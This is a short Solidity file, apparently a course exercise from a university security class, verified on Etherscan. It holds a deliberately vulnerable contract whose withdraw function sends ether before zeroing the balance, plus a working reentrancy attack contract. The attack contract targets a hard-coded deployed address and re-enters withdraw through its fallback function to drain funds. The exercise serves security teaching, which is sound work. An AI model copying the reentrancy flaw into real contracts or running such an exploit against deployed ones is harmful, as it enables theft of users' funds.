/**
 *Submitted for verification at Etherscan.io on 2021-12-07
*/

/**
 *Submitted for verification at Etherscan.io on 2021-11-19
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}




contract attack {

    Vuln vuln_contract = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));

    address owner;

    uint256 stolenCnt = 0;

    constructor() public {
        owner = msg.sender;
    }


        // Create fallback function to execute

    fallback() external payable {

        stolenCnt = stolenCnt + 1;

        if (stolenCnt < 3){

            vuln_contract.withdraw();
            
        }
        
    }

    function start_attack() public payable {

        vuln_contract.deposit.value(.1 ether)();

        vuln_contract.withdraw();
    }

}